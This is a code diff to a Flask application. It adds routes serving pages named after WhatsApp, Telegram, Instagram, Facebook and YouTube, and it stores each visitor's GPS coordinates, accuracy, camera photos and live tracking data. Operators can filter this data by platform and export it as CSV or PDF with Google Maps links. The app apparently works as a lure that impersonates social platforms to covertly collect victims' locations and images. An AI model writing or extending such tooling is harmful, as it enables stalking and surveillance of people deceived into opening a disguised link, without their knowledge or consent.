@@ -53,6 +53,7 @@ class Location(Base):
     photo = Column(Text, nullable=True)
     photo_filename = Column(String(255), nullable=True)
     tracking_type = Column(String(50), default='initial')
+    platform = Column(String(50), default='whatsapp')  # NEW: whatsapp, telegram, instagram, facebook, youtube
     
     def to_dict(self):
         return {
@@ -62,7 +63,8 @@ class Location(Base):
             'accuracy': self.accuracy,
             'timestamp': self.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
             'has_photo': self.photo is not None,
-            'tracking_type': self.tracking_type
+            'tracking_type': self.tracking_type,
+            'platform': self.platform
         }
 
 Base.metadata.create_all(engine)
@@ -87,11 +89,21 @@ try:
                 print("✅ Added tracking_type column")
             else:
                 print("✅ tracking_type column already exists")
+            
+            # NEW: Add platform column
+            result3 = conn.execute(text("SELECT column_name FROM information_schema.columns WHERE table_name='locations' AND column_name='platform'"))
+            if not result3.fetchone():
+                conn.execute(text("ALTER TABLE locations ADD COLUMN platform VARCHAR(50) DEFAULT 'whatsapp'"))
+                conn.commit()
+                print("✅ Added platform column")
+            else:
+                print("✅ platform column already exists")
         else:
             try:
                 conn.execute(text("ALTER TABLE locations ADD COLUMN photo TEXT"))
                 conn.execute(text("ALTER TABLE locations ADD COLUMN photo_filename VARCHAR(255)"))
                 conn.execute(text("ALTER TABLE locations ADD COLUMN tracking_type VARCHAR(50) DEFAULT 'initial'"))
+                conn.execute(text("ALTER TABLE locations ADD COLUMN platform VARCHAR(50) DEFAULT 'whatsapp'"))
                 conn.commit()
                 print("✅ Added columns for SQLite")
             except Exception as e:
@@ -106,7 +118,28 @@ IST = pytz.timezone('Asia/Kolkata')
 
 @app.route('/')
 def home():
-    return render_template('index.html')
+    return render_template('whatsapp.html')  # Default to WhatsApp
+
+# ============ PLATFORM ROUTES ============
+@app.route('/whatsapp')
+def whatsapp_page():
+    return render_template('whatsapp.html')
+
+@app.route('/telegram')
+def telegram_page():
+    return render_template('telegram.html')
+
+@app.route('/instagram')
+def instagram_page():
+    return render_template('instagram.html')
+
+@app.route('/facebook')
+def facebook_page():
+    return render_template('facebook.html')
+
+@app.route('/youtube')
+def youtube_page():
+    return render_template('youtube.html')
 
 @app.route('/save-location', methods=['POST'])
 def save_location():
@@ -122,7 +155,8 @@ def save_location():
             timestamp=ist_now,
             photo=data.get("photo"),
             photo_filename=data.get("photo_filename"),
-            tracking_type=data.get("tracking_type", "initial")
+            tracking_type=data.get("tracking_type", "initial"),
+            platform=data.get("platform", "whatsapp")
         )
         
         session = Session()
@@ -131,7 +165,7 @@ def save_location():
         record_count = session.query(Location).count()
         session.close()
         
-        print(f"✅ Location saved: {data.get('latitude')}, {data.get('longitude')} - Type: {data.get('tracking_type', 'initial')}")
+        print(f"✅ Location saved: {data.get('latitude')}, {data.get('longitude')} - Platform: {data.get('platform', 'whatsapp')}")
         
         return jsonify({
             "status": "success",
@@ -183,11 +217,19 @@ def get_photo(id):
 def api_locations():
     try:
         search = request.args.get('search', '').strip()
+        platform = request.args.get('platform', 'all')
         limit = request.args.get('limit', 100, type=int)
         offset = request.args.get('offset', 0, type=int)
         
         session = Session()
         query = session.query(Location)
+        
+        # Filter by platform
+        if platform != 'all':
+            query = query.filter(Location.platform == platform)
+        
+        # Filter by tracking_type (only initial, not live)
+        query = query.filter(Location.tracking_type != 'live')
         
         if search:
             if search.isdigit():
@@ -237,9 +279,13 @@ def get_live_locations():
 def export_csv():
     try:
         search = request.args.get('search', '').strip()
+        platform = request.args.get('platform', 'all')
         
         session = Session()
         query = session.query(Location)
+        
+        if platform != 'all':
+            query = query.filter(Location.platform == platform)
         
         if search:
             if search.isdigit():
@@ -256,12 +302,13 @@ def export_csv():
         output = io.StringIO()
         writer = csv.writer(output)
         
-        writer.writerow(['ID', 'Latitude', 'Longitude', 'Accuracy (m)', 'Timestamp (IST)', 'Tracking Type', 'Has Photo', 'Google Maps Link'])
+        writer.writerow(['ID', 'Platform', 'Latitude', 'Longitude', 'Accuracy (m)', 'Timestamp (IST)', 'Tracking Type', 'Has Photo', 'Google Maps Link'])
         
         for loc in locations:
             maps_link = f"https://maps.google.com/?q={loc.latitude},{loc.longitude}"
             writer.writerow([
                 loc.id,
+                loc.platform,
                 loc.latitude,
                 loc.longitude,
                 loc.accuracy if loc.accuracy else 'N/A',
@@ -287,9 +334,13 @@ def export_csv():
 def export_pdf():
     try:
         search = request.args.get('search', '').strip()
+        platform = request.args.get('platform', 'all')
         
         session = Session()
         query = session.query(Location)
+        
+        if platform != 'all':
+            query = query.filter(Location.platform == platform)
         
         if search:
             if search.isdigit():
@@ -319,11 +370,11 @@ def export_pdf():
         elements.append(Paragraph(f"Generated on: {current_time} IST", styles['Normal']))
         elements.append(Spacer(1, 20))
         
-        data = [['S.No', 'ID', 'Latitude', 'Longitude', 'Accuracy', 'Timestamp', 'Type', 'Photo', 'Google Maps']]
+        data = [['S.No', 'ID', 'Platform', 'Latitude', 'Longitude', 'Accuracy', 'Timestamp', 'Type', 'Photo', 'Google Maps']]
         
         for idx, loc in enumerate(locations, 1):
             data.append([
-                str(idx), str(loc.id), str(loc.latitude), str(loc.longitude),
+                str(idx), str(loc.id), loc.platform, str(loc.latitude), str(loc.longitude),
                 str(loc.accuracy if loc.accuracy else 'N/A'),
                 loc.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                 loc.tracking_type or 'initial',
@@ -357,7 +408,7 @@ def export_pdf():
 def api_stats():
     try:
         session = Session()
-        total = session.query(Location).count()
+        total = session.query(Location).filter(Location.tracking_type != 'live').count()
         live_total = session.query(Location).filter(Location.tracking_type == 'live').count()
         session.close()
         return jsonify({'total_records': total, 'live_records': live_total})
@@ -376,24 +427,24 @@ def delete_location(id):
         
         session.delete(location)
         session.commit()
-        total = session.query(Location).count()
+        total = session.query(Location).filter(Location.tracking_type != 'live').count()
         session.close()
         
         return jsonify({"status": "success", "message": f"Record {id} deleted successfully", "total_records": total})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# ============ DELETE ALL API ============
 @app.route('/api/delete-all', methods=['DELETE'])
 @login_required
 def delete_all_locations():
     try:
         session = Session()
-        deleted_count = session.query(Location).delete()
+        # Delete only initial records (not live)
+        deleted_count = session.query(Location).filter(Location.tracking_type != 'live').delete()
         session.commit()
         session.close()
         
-        print(f"✅ Deleted all {deleted_count} records")
+        print(f"✅ Deleted all {deleted_count} initial records")
         
         return jsonify({
             "status": "success",
